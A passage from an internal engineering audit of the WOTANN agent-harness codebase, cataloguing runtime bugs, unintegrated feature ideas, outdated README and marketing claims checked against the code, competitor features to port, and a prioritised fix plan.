| 25 | **`wotann companion start` command broken** — "too many arguments for 'start'. Expected 0 arguments but got 2" (commander schema misconfigured) | HIGH | MASTER_AUDIT §35.0 | `src/index.ts` | E2E test caught; command is dead |
| 26 | **Thin-client mode is DEAD CODE** — `thin-client.ts:22` probes `~/.wotann/daemon.sock`; daemon creates `~/.wotann/kairos.sock`; auto-detection never succeeds | CRITICAL | MASTER_AUDIT §35.0 | `thin-client.ts:22` | Only activates with explicit `WOTANN_THIN=1`; fixes 2-5x cold start for daemon users |
| 27 | **`daemon start --verbose` rejected** — flag unknown | LOW | MASTER_AUDIT §35.0 | `daemon/start.ts` | E2E gap |
| 28 | **`wotann doctor` only has 3 checks** — doesn't verify daemon health, socket, DB integrity, Ollama reachability, port conflicts, API key validity | MEDIUM | MASTER_AUDIT §35.0 | `cli/doctor.ts` | Shallow "doctor" command |

---

## 5. Feature Ideas in Old Docs — Never Integrated into Action Plans

47 items across the corpus. Catalog formatted: `[source-doc § identifier] — <idea>`.

| # | Source | Feature |
|---|---|---|
| 1 | HIDDEN_STATE §G.1 #1 | Startup sweep for `.wotann/*.tmp.*` files older than 1 hour |
| 2 | HIDDEN_STATE §G.1 #2 | Orphan-WAL detection in `wotann doctor --strict` (6 orphaned `memory N.db-shm/-wal` pairs in current `.wotann/`) |
| 3 | HIDDEN_STATE §G.1 #3 | Instrument session_start event emission (1,983:3 skew proves session_end fires without starts) |
| 4 | UI_DESIGN_SPEC §4.2 | **Huginn & Muninn split pane** — `⌘⇧2` dual-provider critique pane; zero mention in any subsequent audit or execution plan |
| 5 | UI_DESIGN_SPEC §4.5 | **Raven's Flight iOS↔desktop sync animation** — parabolic arc across full-screen canvas on session transfer |
| 6 | UI_DESIGN_SPEC §4.6 | **Sigil Stamp** — 4x4px gold sigil on tab + persistent 1px gold underline with hover-reveal scrub prompt |
| 7 | UI_DESIGN_SPEC §4.7 | **Council Mode (⌘⇧C)** — structured fan-out to 3-4 providers with voting bar; palette mis-routes to `compare` (bug still open) |
| 8 | UI_DESIGN_SPEC §5.1 | **Mead-Hall palette tiered-depth morphing** — three tab-key keystroke rhythm morphs palette → plan canvas → full-canvas Miro-like surface |
| 9 | UI_DESIGN_SPEC §5.2 | **Conversation Braids (⌘⇧B)** — 2-4 parallel threads on one canvas with per-braid cost tracking and `twist into main` merge provenance |
| 10 | UI_DESIGN_SPEC §7 | **Five-onboarding-hooks system**: Well of Mimir, Summoning (Thor/Odin/Loki/Freya patrons), Rune Revealed keyboard tutor, Cost Glint specular sheen on paid keys, First Quest card |
| 11 | UI_DESIGN_SPEC §8 | **In-house sound design** — 4 cues (Rune-tap, Well-hum, Wax-seal press, Wood-knock) produced at 48kHz/24-bit |
| 12 | UI_DESIGN_SPEC §9.2-9.5 | **Apple Watch / Complication / CarPlay templates** — rune-state mapping (Fehu=idle, Raidho=running, Ansuz=awaiting, Tiwaz=proof-complete); "forge rests while you drive" safety pattern |
| 13 | SESSION_8_UX_AUDIT TD-2.2 | Voice button radial pulse on press-and-hold (wire to RuneForgeIndicator) |
| 14 | SESSION_8_UX_AUDIT TD-2.3 | @-reference composer placeholder rotation hint or inline `@` chip |
| 15 | SESSION_8_UX_AUDIT TD-5.0.1 | Settings cross-section search bar (macOS System Settings-style) |
| 16 | SESSION_8_UX_AUDIT TD-5.3.1 | Theme × Signature palette matrix preview — user confusion noted |
| 17 | SESSION_8_UX_AUDIT TD-6.2 | "Run Doctor" secondary link next to Reconnect banner |
| 18 | SESSION_8_UX_AUDIT TD-9.3 | Cost Dashboard split into Overview vs Provider Comparison (2 views) |
| 19 | SESSION_8_UX_AUDIT CP-5 | Session-8 features promoted in Welcome rotation (ACP / Raven / 5 themes) |
| 20 | UNKNOWN_UNKNOWNS §G.2 #8 | Raft/Gossip/Byzantine consensus for multi-agent coordination (Ruflo pattern) |
| 21 | UNKNOWN_UNKNOWNS §G.2 #9 | DangerousCommandApproval with 30+ regex + smart auto-approve via auxiliary LLM (Hermes) |
| 22 | UNKNOWN_UNKNOWNS §G.2 #10 | PluginEval Platinum/Gold/Silver/Bronze certification (wshobson — 10 quality dimensions + Monte Carlo) — NOT applied to WOTANN's 89 skills |
| 23 | UNKNOWN_UNKNOWNS §G.4 #15 | Fix `context/limits.ts` undercounts: Opus 4.6 (1M actual), GPT-5.4 (1,050,000), Grok 4.20 (2M — largest) |
| 24 | UNKNOWN_UNKNOWNS §G.4 #16 | 11 missing free-code flags: HISTORY_PICKER, MESSAGE_ACTIONS, QUICK_SEARCH, SHOT_STATS, CACHED_MICROCOMPACT, BRIDGE_MODE, BASH_CLASSIFIER, KAIROS_BRIEF, AWAY_SUMMARY, LODESTONE, TREE_SITTER_BASH |
| 25 | UNKNOWN_UNKNOWNS §G.4 #17 | Theory-of-Mind module (OpenHands) — user-intent inference via internal user model |
| 26 | UNKNOWN_UNKNOWNS §G.4 #18 | IPFS code archival (free-code) — permanent pinned code on IPFS/Filecoin |
| 27 | UNKNOWN_UNKNOWNS §G.5 #22 | Onyx 50+ knowledge connectors (distinct from messaging channels) — WOTANN has 25 channels but only 6 connectors |
| 28 | UNKNOWN_UNKNOWNS §G.5 #24 | MCP OAuth 2.1 PKCE (Hermes v0.4) — WOTANN MCP registry may not support PKCE |
| 29 | UNKNOWN_UNKNOWNS §G.5 #25 | Compression-Death-Spiral prevention (Hermes) — distinct from generic doom-loop |
| 30 | UNKNOWN_UNKNOWNS §G.5 #26 | GPT Tool-Use Enforcement (Hermes v0.5) — prevent GPT from describing tool calls in text |
| 31 | UNKNOWN_UNKNOWNS §G.5 #27 | Multi-Instance Profiles (Hermes v0.6) — isolated WOTANN instances from same install |
| 32 | UNKNOWN_UNKNOWNS §G.5 #28 | Plugin Lifecycle Hooks (Hermes v0.5) — pre/post LLM call + session hooks |
| 33 | UNKNOWN_UNKNOWNS §G.6 #30 | `/worktree` command (Cursor 3) — one command creates git worktree for isolated agent work |
| 34 | UNKNOWN_UNKNOWNS §G.6 #31 | Await Tool for Agents (Cursor 3) — agents wait for background shell commands OR specific output patterns |
| 35 | UNKNOWN_UNKNOWNS §G.6 #33 | Notepads / Reusable Context (Cursor 3) — save prompts/coding standards/API patterns |
| 36 | UNKNOWN_UNKNOWNS §G.6 #35 | 5 LightRAG Retrieval Modes: Naive/Local/Global/Hybrid/Mix (WOTANN has RRF hybrid but not graph-based Local/Global/Mix) |
| 37 | UNKNOWN_UNKNOWNS §G.6 #37 | 5 Terminal Backends beyond local (Hermes: Docker/SSH/Daytona/Modal/Singularity) |
| 38 | UNKNOWN_UNKNOWNS §G.6 #40 | Ultra-Low Frame Rate Tokenizers (7.5 Hz continuous speech) — research-level voice stack |
| 39 | UNKNOWN_UNKNOWNS §G.7 #42 | Foundation Context Pattern (coreyhaines31) — one base skill all domain skills consult |
| 40 | UNKNOWN_UNKNOWNS §G.7 #43 | Self-Assessment Quizzes as skills (claude-howto) — meta-skill that tests user knowledge |
| 41 | UNKNOWN_UNKNOWNS §G.7 #44 | Defuddle clean web extraction (kepano) — token-budget-optimized markdown from URLs |
| 42 | UNKNOWN_UNKNOWNS §G.7 #45 | AgentShield 102 security rules + 1282 tests (everything-claude-code) — pre-install scanner for skills/MCPs |
| 43 | UNKNOWN_UNKNOWNS §G.7 #46 | Hook runtime profiles: minimal/standard/strict (ECC `HOOK_PROFILE`) |
| 44 | UNKNOWN_UNKNOWNS §G.7 #47 | 5-layer observer loop prevention (ECC) — layered breakers vs WOTANN single layer |
| 45 | UNKNOWN_UNKNOWNS §G.7 #48 | Selective install architecture with manifest-driven pipeline (`--minimal`/`--standard`/`--full`/`--features`) |
| 46 | UNKNOWN_UNKNOWNS §G.7 #49 | Cross-harness parity (ECC) — Claude Code + Cursor + OpenCode + Codex skills interop |
| 47 | UNKNOWN_UNKNOWNS §G.7 #50 | Persona system with C-level advisory (alirezarezvani) — Startup CTO / Growth Marketer / Solo Founder pre-built personas |

---

## 6. Stale Claims to Remove from CLAUDE.md / README / Marketing

Based on deep-read evidence — these claims are still shipping but contradict the running code.

| # | Stale claim | Where it lives | Reality per deep read | Action |
|---|---|---|---|---|
| 1 | "26-layer middleware pipeline" | README + CLAUDE.md directory list | MASTER_AUDIT §48: 2 transform LLM data, 16 conditional, 5 advisory (flags unread), 2 structurally dead | Change to "20+ middleware layers (2 always-on, 16 conditional)" |
| 2 | "42 intelligence modules" | README | MASTER_AUDIT §63: 21 meaningfully affect model behavior | Change to "21+ intelligence modules that shape model behavior" |
| 3 | "29 orchestration patterns" | README | MASTER_AUDIT §64: 10 genuine patterns + 7 infrastructure + 8 re-export-only + 1 dead | Change to "10 multi-step orchestration patterns + supporting infrastructure" |
| 4 | "20+ themes" | README / DESIGN.md | MASTER_AUDIT §3: `src/ui/themes/` directory EMPTY | UI_UX_AUDIT confirms `wotann-tokens.css` has 5 themes, not 20 | Change to "5 themes (Mimir/Yggdrasil/Runestone/Bifrost/Valkyrie)" |
| 5 | "TurboQuant context extension" | README + `src/context/turboquant.ts` filename | MASTER_AUDIT §20: `turboquant.ts` is 381-line marketing lie (maps bits to Ollama `q2_K`/`q4_0`/`q8_0`) | Rename file to `ollama-kv-compression.ts`; update README |
| 6 | `wotann autopilot` command | README | Command does not exist (only `wotann autonomous`) | Fix command name in docs |
| 7 | `wotann compare` command | README | Command is `wotann arena` | Fix or add alias |
| 8 | "TerminalBench +15-25% from harness" | Marketing | No scoring runner exists; number unverified locally | Ship actual benchmark runner (Phase 4) before claiming |
| 9 | "TerminalBench 83-95% target" | `project_wotann_plan_v3.md` | MASTER_AUDIT §30: SOTA is 82% (Claude Mythos Preview); claiming 83-95% is marketing red flag | Change to "75-85% aspirational, top-3 competitive target" |
| 10 | "1M context" | Limits.ts + marketing | Hardcoded in limits.ts, never runtime-probed; UNKNOWN_UNKNOWNS §G.4 #15 confirms Opus 4.6 (1M real), GPT-5.4 (1,050,000), Grok 4.20 (2M) — WOTANN undercounts | Update limits.ts + runtime-probe on init |
| 11 | "proof bundles attached to every completion" | README | Proof system exists but not attached to every completion | Change to "proof bundle generation available" |
| 12 | "Switch mid-session without losing tools" | CLAUDE.md capability claims | Tool serialization DEAD in 4/5 adapters (MASTER_AUDIT §10) | Remove until fixed, or add "Ollama only today" footnote |
| 13 | "86 skills" / "89 skills" / "76 skills" | Various docs | Skills count drifts: 86 on disk, 76 load (10 silent drops from missing frontmatter) | Single source of truth + fix the 10 silent drops |
| 14 | "24 channels" | README + spec | MASTER_SYNTHESIS §1: 17 adapters real, 7 missing (Mastodon/Twitter/LinkedIn/Instagram/WeChat/Line/Viber) | Either change to "17 channels" or ship the 7 |
| 15 | "Immutable data patterns throughout" | CLAUDE.md | MASTER_AUDIT §28.2: 288 files with `.push()` = 1,620 occurrences; weighted adherence 83% | Amend to "Immutable value types; encapsulated mutable services" |
| 16 | "Claude Agent SDK MIT-licensed" | package.json `"license": "MIT"` bundles proprietary `@anthropic-ai/claude-agent-sdk` | MASTER_AUDIT §28.4 LICENSE BLOCKER | Move SDK to `peerDependencies` |
| 17 | "compiles cleanly / 0 `any`" | CLAUDE.md strict-mode claim | MASTER_AUDIT §3: 9 `any` uses | Minor but drift |
| 18 | "autoDream nightly memory consolidation ≤200 lines / 25KB" | Claude Code leak / internal spec | Dream pipeline fires on empty 5+ times — no consolidation happens | Fix Layer 0 → Layer 1-7 promotion OR remove claim |
| 19 | "Proactive memory rules (5 regex rules)" | Spec | MEMORY_ORCHESTRATION §2.18: `proactive-memory.ts` has 5 KNOWN_ISSUES + 5 FILE_ASSOCIATIONS — real | Mostly accurate; cite the `5+5` split |
| 20 | "Capability equalization (thinking, tools, vision)" | Capability moat claim | MASTER_AUDIT §49: thinking works; tools disconnected (`tools` dropped in agent-bridge.ts); vision is placeholder text `"[Image provided]"` | Either fix the two missing or demote the claim |

---

## 7. Competitor Features from LANE1-8 Extractions NOT in Lane 2

Cross-reference: Lane 2 (`AUDIT_LANE_2_COMPETITORS.md`) was 78K. These items from LANE1 / LANE4 / LANE5 / LANE6 / LANE8 / V3_WEB / V4_NEW_SOURCES are NOT in Lane 2 and NOT in any active action plan.

| # | Source | Competitor feature | Port effort | Priority |
|---|---|---|---|---|
| 1 | V3_WEB §3 Emdash | **SSH-remote project execution** (10-connection pool + SFTP + fingerprint-check + OS-keychain + proxy-command) — 800 LOC Apache-2.0 direct port | 1 week | HIGH — WOTANN gains "run agents on prod box" |
| 2 | V3_WEB §2 Solo | **MCP-exposed process dashboard** (`wotann_list_processes` / `wotann_restart_process` MCP tools) — expose Engine daemon to MCP clients | 3 days | HIGH — closes "agent asks before acting" loop |
| 3 | V3_WEB §3 Emdash | **Task-keyed `agents/` docs structure** — split monolithic AGENTS.md into `agents/{architecture,workflows,integrations,risky-areas,conventions}/` for progressive disclosure | 1 day | MEDIUM — 2x useful content agents can discover |
| 4 | V3_WEB §3 Emdash | **`ClaudeHookService` pattern** — central daemon receives hooks from remote Claude Code child processes (not just local agent) | 3 days | MEDIUM |
| 5 | V3_WEB §4 Superset | **`ask_user` interactive-overlay tool** — MCP-style tool returning structured response; UI renders clickable options. Elastic-v2-inspired (clean-room impl) | 2 days | HIGH — reduces ambiguity errors dramatically |
| 6 | V3_WEB §4 Superset | **Per-agent native resource metrics** (via `pidusage` npm) — MCP tool `wotann_list_agents_metrics` showing CPU/RAM/disk per agent | 2 days | MEDIUM |
| 7 | V3_WEB §1 Glass | **License-compliance CI gate** — `cargo-about`-equivalent `license-checker` in CI, fails on unresolved/non-allowlisted SPDX | 1 day | LOW (maturity signal) |
| 8 | V3_WEB §5 JetBrains Air | **ACP Agent Registry integration** — `wotann acp install <agent-id>` to pull agents from the Registry (joint JetBrains/Zed launch Jan 2026) | 3 days | HIGH — WOTANN gets listed + can install |
| 9 | V3_WEB §5 JetBrains Air | **Docker-sandboxed agent execution** — `wotann autopilot --sandbox docker` spins Alpine container + worktree mount | 3 days | MEDIUM |
| 10 | V3_WEB §5 JetBrains Air | **`@symbol` mention syntax** — typing `@MyClass::myMethod` auto-attaches LSP-resolved symbol + body as context | 2 days | MEDIUM |
| 11 | V3_WEB §7 Gemini Mac | **Global keyboard shortcut HUD** (`Option+Shift+W`) — 320x80px always-on-top Tauri window, one-turn query via lowest-cost provider | 3 days | MEDIUM — macOS presence moat |
| 12 | V3_WEB §7 Gemini Mac | **Window-sharing contextual help** — HUD auto-attaches screenshot of focused app as context | 2 days | MEDIUM |
| 13 | V3_WEB §8 Perplexity Computer | **`wotann audit` mode** — read-only agent, no Write/Edit, pure review pass against file/dir + WebSearch fact-check + markdown report | 3 days | HIGH — clear differentiation from "agent rewrites" default |
| 14 | V3_WEB §10 Cursor 3 | **Cross-channel first-class agent kickoff** — every one of 17 channels accepts `/wotann fix this bug` commands that spawn agents | 1 week | HIGH — 6-surface parity with Cursor 3 |
| 15 | V3_WEB §10 Cursor 3 | **Agent artifact production per run** — `.wotann/runs/{run-id}/artifacts/{screenshot.png, diff.patch, demo.md, demo.webm}` | 2 days | MEDIUM |
| 16 | V3_WEB §10 Cursor 3 | **Private team marketplace** — `wotann team marketplace add <url>`; team-private skill/MCP distribution | 1 week | LOW (paid tier) |
| 17 | V3_WEB §3 Emdash | **Forgejo adapter** — self-hosted-git integration alongside GitHub/GitLab/Jira/Linear | 1 day | LOW (enterprise niche) |
| 18 | V4_NEW_SOURCES §1 t3code | **Provider-as-subprocess wrapper** — spawn 3rd-party CLI agents (codex app-server, claude-code-acp, cursor, opencode) via JSON-RPC stdio; provider crash doesn't kill harness | Large | HIGH — isolation + easier upgrades |
| 19 | V4_NEW_SOURCES §1 t3code | **PROVIDER_SEND_TURN_MAX_* hard limits** — 120,000 input chars / 8 attachments / 10 MB image / 14,000,000 data URL chars | Small | MEDIUM — attachment DoS surface |
| 20 | V4_NEW_SOURCES §1 t3code | **KeyedCoalescingWorker** — latest-wins per-key queue with merge reducer; eliminates streaming-event thrash | Medium | MEDIUM |
| 21 | V4_NEW_SOURCES §1 t3code | **Contracts package with zero runtime** (`@wotann/contracts`) — consolidate types scattered across 7+ type-only modules into single schema source (for desktop + iOS Swift codegen + CLI) | Medium | MEDIUM |
| 22 | V4_NEW_SOURCES §1 t3code | **CQRS event-projection pipeline** (9 projectors: projects, threads, thread-messages, turns, approvals, etc.) — read-side separation for cheap queries | Large | LOW (premature) |
| 23 | V4_NEW_SOURCES §2 omi v2 | **Rust backend replica for perf/safety** (`Backend-Rust/src/` — 28,882 LOC including firestore.rs 9,763 LOC) — ported Python critical paths | V. large | LOW (not urgent — reference only) |
| 24 | V4_NEW_SOURCES §2 omi v2 | **Unix-socket tool-call relay** (acp-bridge `omi-tools` — `pendingToolCalls: Map<string, resolver>` with callId correlation) — cross-process tool isolation | Medium | MEDIUM — isolate computer-use crashes |
| 25 | V4_NEW_SOURCES §2 omi v2 | **Session warmup with per-session system prompts** — `WarmupMessage { sessions: [{key, model, systemPrompt}] }` concurrent warming | Small | MEDIUM — wire `src/providers/prompt-cache-warmup.ts` (currently orphan) |
| 26 | V4_NEW_SOURCES §2 omi v2 | **`@zed-industries/claude-agent-acp` npm dep** — use upstream ACP SDK instead of hand-rolled `src/acp/` | Medium | MEDIUM — protocol-drift safer |
| 27 | V4_NEW_SOURCES §2 omi v2 | **2,065-LOC single-feature VAD-gate test** — pattern for high-depth voice testing | Medium | LOW — test depth reference |
| 28 | MEMORY_ARCHAEOLOGY §8 FD-3 | Forgecode-techniques: wire 2 salvageable exports (StaleReadTracker + getTimeoutForCommand); delete 5 dead exports (`getModelProfile`, `runPreCompletionChecklist`, `discoverEntryPoints`, `allocateReasoningBudget`, `autoInstallMissingDep`) | Small | MEDIUM |
| 29 | MEMORY_ARCHAEOLOGY §8 FD-5 | S5-12 intel getter-only modules (6) — wire or document as advisory | Small | LOW |
| 30 | MEMORY_ARCHAEOLOGY §8 FD-6 | Edge TTS — exists as `edge-tts-backend.ts`, never called from `voice-pipeline.ts`; wire into cascade | Small | LOW |
| 31 | MEMORY_ARCHAEOLOGY §8 FD-14 | Agent Skills open-standard compliance (~350 LOC, MIT) — 1000s of OSS skills for free | Medium | HIGH |
| 32 | MEMORY_ARCHAEOLOGY §8 FD-14 | Code Mode (~450 LOC, Apache-2.0) — 70-90% context cost reduction on multi-step flows | Medium | HIGH |
| 33 | MEMORY_ARCHAEOLOGY §8 FD-14 | Claude Code Monitor tool pattern (~150 LOC) — long-running observers that can interrupt the agent | Small | MEDIUM |
| 34 | MEMORY_ARCHAEOLOGY §8 FD-14 | Conductor's "reset to previous turn" UI gesture `/undo-turn` + sidebar surface | Small | MEDIUM |
| 35 | MEMORY_ARCHAEOLOGY §8 FD-14 | GenericAgent self-crystallization (~400 LOC, MIT) — auto-generate skills from session traces | Medium | MEDIUM |
| 36 | MEMORY_ARCHAEOLOGY §8 FD-14 | Hooks `if` field + `prompt`/`agent` handler types (~300 LOC) | Medium | LOW |
| 37 | DOCS_FULL_READ §repo-updates | LightRAG JWT alg-none vulnerability check (GHSA-8ffj-4hx4-9pgf) — audit Codex adapter JWT paths | Small | HIGH (security) |
| 38 | DOCS_FULL_READ §repo-updates | sonnet-4-5 → sonnet-4-6 model-ID rename — check for hardcoded references | Small | LOW |
| 39 | DOCS_FULL_READ §repo-updates | MCP transport reality — stdio/sse/http only (no WebSocket) — verify WOTANN MCP doesn't assume WebSocket | Small | MEDIUM |
| 40 | DOCS_FULL_READ §repo-updates | mem0 LLM-hallucinated ID guard — defensive pattern for memory UUID lookups | Small | MEDIUM |
| 41 | DOCS_FULL_READ §research-repo-updates | deer-flow `available_skills` per-agent skill filter API — clean minimal API pattern | Small | MEDIUM |
| 42 | DOCS_FULL_READ §research-repo-updates | deer-flow loop detection via stable hash keys for tool calls | Small | MEDIUM |
| 43 | DOCS_FULL_READ §research-repo-updates | deer-flow positive-reinforcement detection in memory middleware — novel pattern | Medium | MEDIUM |
| 44 | DOCS_FULL_READ §research-repo-updates | oh-my-openagent `tool_use/tool_result` pair validator (defensive) | Small | MEDIUM |
| 45 | DOCS_FULL_READ §research-repo-updates | oh-my-openagent atomic config migration (temp-file + rename) | Small | LOW |
| 46 | NEXUS_V4_SPEC §75-87 Appendix E | TTSR (Time-Traveling Stream Rules) — regex-triggered injections into model output streams; WOTANN has `ttsr.ts` but NOT in pipeline (dead) | Medium | MEDIUM — wire into pipeline |
| 47 | NEXUS_V4_SPEC §75-87 Appendix E | `@file` inline injection — typing `@path` auto-injects file contents into prompt | Small | MEDIUM — user-facing nicety |

---

## 8. The Two Subsystems That Are SILENTLY BROKEN At Runtime

These are not just bugs — they're functional lies that run every day without visible failure.

### 8.1 active-memory recall (MEMORY_ORCHESTRATION §2.3)

```
File: src/memory/active-memory.ts:128-146
Cast: memoryStore as unknown as { search(q): { content: string }[] }
Filter: r => typeof r.content === "string"
Reality: MemoryStore.search() returns MemorySearchResult[] where text is at .entry.value
Impact: Every recall call returns null. The "tight synchronous write/read loop" claim is
        write-only. Dream pipeline eventually picks up writes, so data isn't lost — but
        the advertised "synchronous, not async-after-the-fact" semantics is false for recall.
Fix: ~5 LOC — change field access + type annotation.
```

### 8.2 token-stats.json / cost-tracker silent writes (HIDDEN_STATE §A.1)

```
File: .wotann/token-stats.json
Current state: {"totalInputTokens":0, "totalOutputTokens":0, "sessionCount":2225, "byProvider":{}}
Reality: 2,225 sessions across 16 days, ZERO tokens attributed to any provider.
         session_end events fire with zeros:
         "Duration: 0m 0s, Provider: anthropic (auto), Tokens: 0, Cost: $0.0000,
          Tool calls: 0, Messages: 0"
         session_start:session_end ratio is 3:1,983 (600:1 skew — end events fire without starts)
Impact: Cost telemetry is silently wrong. Any "X% cost savings" claim is unverified.
Fix: Medium — wire session_start emission; wire cost-tracker to persist per-provider totals.
```

---

## 9. Recommended Immediate Action Order (delta from Lane 1-5)

These items are NEW or more-specific than Lane 1-5 ship-blocker lists. Total: ~40 engineering hours for a tight subset.

**Tier 0 (critical, 1-2 days):**

1. Close the 12 ship-stopping bugs in §4 not yet on Lane 1-5 lists, especially:
   - Azure URL compat adapter (30 min)
   - Bedrock stream regex parser (1 day)
   - Vertex SSE content_block_start handling (1 day)
   - active-memory `.content` → `.entry.value` (5 LOC)
   - verificationEnforcement trackToolResult matching (command not output)
2. Fix SOUL.md regex character (30 sec commit, activates 52 lines of Norse identity)
3. Rename `turboquant.ts` → `ollama-kv-compression.ts` (10 min)
4. Move `@anthropic-ai/claude-agent-sdk` to peerDependencies (10 min)
5. Delete the 30+ zombie `.wotann/knowledge-graph.json.tmp.*` files + add cleanup hook on process exit (30 min)

**Tier 1 (HIGH leverage, 3-5 days):**

6. Delete `runtime-tool-dispatch.ts` + `runtime-tools.ts` OR complete the extraction refactor — stop the drift (2 days)
7. Wire cost-tracker to actually persist per-provider totals (token-stats.json empty across 2,225 sessions) (1 day)
8. Instrument session_start emission to fix 3:1,983 session_start:session_end skew (0.5 day)
9. Remove the 10 advisory-only HookEvent variants from `types.ts` union OR wire producers (0.5 day)
10. Rate-limit `pushNotification` / `proactiveCheck` (0.5 day)
11. Wire the 7 existing but unregistered connectors (confluence/google-drive/jira/linear/notion/slack/confluence) (1 day)
12. Fix `validate_path` requiring canonicalize-success — breaks write_file for new files (30 min)

**Tier 2 (architectural, 1-2 weeks):**

13. Add event listener cleanup (73 `.on()` / 0 `.off()`) (4h)
14. Add retention policies (audit_trail / auto_capture / trace-analyzer / arena-leaderboard) — 30-day rolling, FIFO caps (3h)
15. Consolidate duplicate conversation data structures (conversation-tree.ts vs conversation-branching.ts)
16. Consolidate triple contradiction detectors (store.ts / contradiction-detector.ts / pluggable-provider.ts)
17. Ship `ask_user` interactive-overlay tool (§7 #5) — clean-room Elastic-v2 pattern
18. Ship `wotann audit` mode (§7 #13) — read-only fact-check differentiator
19. Wire SSH-remote project execution (§7 #1) — Apache-2.0 Emdash port

**Tier 3 (stale claims):**

20. Ship all 20 README/CLAUDE.md corrections in §6 — get advertising to match code

---

## 10. What's Already Accurate (Doc-Verified) — Don't Re-Audit

For saving audit-cycles in future sessions:

- **iOS Swift target is genuinely production-grade** (IOS_SWIFT_DEEP_READ §1-9). Zero TODO/FIXME, one legitimate fatalError. MLX/FoundationModels/CarPlay/HealthKit/NFC/ContinuityCamera/LocalSend receive all REAL.
- **Tauri Rust layer is fully real** (TAURI_RUST + UI_PLATFORMS). 131 commands, zero silent stubs (6 labeled C6 honest stubs). UDS JSON-RPC client correct. launchd plist writes real.
- **14+ channel adapters are real HTTP/WebSocket implementations** (CHANNELS_ACP §1). Discord/Slack/Telegram/WhatsApp/iMessage/Signal/Matrix/IRC/Teams/Email/SMS/Webchat/Webhook/GitHub-bot all working.
- **ACP is fully implemented** end-to-end (CHANNELS_ACP §2). stdio + protocol + server + runtime-handlers + CLI command.
- **OAuth login is production-ready** (CHANNELS_ACP §5). PKCE + OS-assigned ports + device-code fallback + cross-platform browser + 6 providers.
- **LSP symbol-operations module is real** (CHANNELS_ACP §6). 773 LOC with TypeScript Language Service + multi-language fallback regex.
- **Memory SQLite schema is mature** (MEMORY_ORCHESTRATION §2.1). 21 tables, WAL mode, FTS5 on entries + verbatim drawers, bi-temporal knowledge edges, consolidation locks, provenance log.
- **3-phase dream pipeline (Light/REM/Deep) with 6 signal weights is implemented** — just never gets non-empty input.
- **Autonomous executor has 8 strategies + doom-loop detection + circuit breaker + shadow-git + oracle/worker hook** — but the RPC handler is a string prefix stub.
- **Cost tracking works end-to-end for queries** — honest estimates. But silent writes for session totals.
- **Context compaction: 4/5 strategies work, auto-invoked at 50%/70%/85%/95% pressure thresholds**.

---

## 11. Closing Note

This synthesis is ~10,000 words covering 88 items across 27 deep-read docs. The **single biggest payback is §4 (ship-stopping bugs) + §8 (silently-broken subsystems)** — fixing those restores honesty to claims that currently run without failing loudly. The **second biggest payback is §6 (stale claims)** — getting README and marketing to match the running code prevents "harness amplifies every model" positioning from being contradicted by a one-line fetch-body capture.

Everything in §7 (47 competitor features) is optional scope. Everything in §5 (47 unintegrated ideas) is design exploration. Everything in §3 (architectural contradictions) is documentation hygiene.

If a future session reads only ONE table from this doc: read §4.

---

*End of AUDIT_DEEPREAD_SYNTHESIS. Generated 2026-04-20 by exhaustive read of Tier 1/2 deep-read corpus. Total source material: ~800 KB across 27 docs. Companion: `MASTER_AUDIT_2026-04-14.md`, `MASTER_SYNTHESIS_2026-04-18.md`, `HIDDEN_STATE_REPORT.md`, `UNKNOWN_UNKNOWNS.md`.*
